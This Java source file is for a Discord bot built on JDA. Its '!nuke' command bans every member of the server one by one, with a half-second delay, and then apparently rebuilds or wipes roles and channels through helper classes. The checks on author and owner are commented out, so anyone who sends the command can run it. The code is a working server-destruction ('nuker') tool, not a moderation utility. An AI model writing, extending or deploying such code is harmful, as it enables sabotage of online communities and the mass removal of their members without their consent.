package com.cooleg.bot;

import com.cooleg.bot.Parts.Channels;
import com.cooleg.bot.Parts.Roles;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.util.List;

public class EventListen extends ListenerAdapter {

    JDA jda = Bot.getJda();

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {return;}
//        if (event.getAuthor().getId() != "308702273154973717") {return;}
        String msg = event.getMessage().getContentRaw();
        System.out.println(msg);
        if (msg.startsWith("!stop")) {
            Bot.shutDown();
        } else if (msg.startsWith("!nuke")) {
            try {
                Nuke(event.getGuild());
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    public void Nuke(Guild guild) throws InterruptedException {
        guild.getChannels();
//        if (guild.getOwnerId() == "308702273154973717") {return;}
        guild.loadMembers();
        List<Member> members = guild.getMembers();
        for (Member member : members) {
            try {
                guild.ban(member, 0);
                System.out.println("Person was banned!");
                Thread.sleep(500);
            } catch (Exception e) {
                System.out.println("Person was higher then the bot, skipping...");
            }
        }
        System.out.println("Done banning everyone...");
        new Roles(guild);
        new Channels(guild);
    }

}
